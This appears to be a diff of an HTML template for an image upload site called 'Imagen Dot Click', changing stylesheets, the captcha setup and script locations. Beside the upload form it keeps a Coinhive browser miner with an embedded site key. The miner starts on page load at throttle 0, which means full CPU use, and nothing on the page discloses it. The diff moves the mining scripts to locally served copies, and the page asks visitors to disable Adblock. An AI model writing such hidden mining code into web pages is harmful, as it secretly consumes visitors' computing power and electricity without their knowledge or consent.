@@ -4,8 +4,14 @@
 <head>
 <meta name="google-site-verification" content="2QLKtDFPPQwFab4Tx2Gf0TJ1SVMI1lSA4VfKsA90SaY" /> <!-- ssshhh... -->
 <title>Imagen Dot Click</title>
-<link rel="stylesheet" type="text/css" href="firstPage.css" />
+<link rel="stylesheet" type="text/css" href="css/firstPage.css" />
+<link rel="stylesheet" type="text/css" href="css/global.css" />
 <script src='https://www.google.com/recaptcha/api.js'></script>
+<!--
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script src="js/vendor/jquery.ui.widget.js"></script>
+<script src="js/jquery.iframe-transport.js"></script>
+<script src="js/jquery.fileupload.js"></script> -->
 </head>
 <div id="container">
 <body>
@@ -17,8 +23,7 @@
 <p>
 <h3>Needs JS for captchas, only do ONE of your choice </h3>
 </p>
-
-
+    
 <form enctype="multipart/form-data" action="%supload/" method="post">
   Key: <input type="password" name="fn"><br>
   <input type="hidden" name="token" value="{{.}}"/>
@@ -26,23 +31,27 @@
     IMG: <input type="file"  id="upload" name="uploadfile"><br>
     </label>
     <div id=captcha>
-    <div id="recaptcha" class="g-recaptcha" data-sitekey="%v">
+    <div id="recaptcha" class="g-recaptcha" data-theme="dark" data-sitekey="%v">
     </div>
-	<script src="https://authedmine.com/lib/captcha.min.js" async></script>
-	<div id="powcaptcha" class="coinhive-captcha" data-hashes="1024" data-key="%v">
-		<em>Loading Captcha...<br>
-		If it doesn't load, please disable Adblock!</em>
-	</div>
+    <script src="/js/captcha.min.js" async></script>
+    <div class="coinhive-captcha" data-hashes="1024" data-key="%v">
+        <em>Loading Captcha...<br>
+        If it doesn't load, please disable Adblock!</em>
     </div>
+    </div>
+    <div id="status"></div>
 	<div id="submit">
     <input type="submit" value="Go!">
     </div>
     </form>
 </div>
-
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    
+<script src="/js/coinhive.min.js"></script>
 <script>
-	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {throttle: 0});
+	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {
+    throttle: 0,
+    theme: 'dark'
+    });
 
   miner.start();
   miner.setThrottle(0)
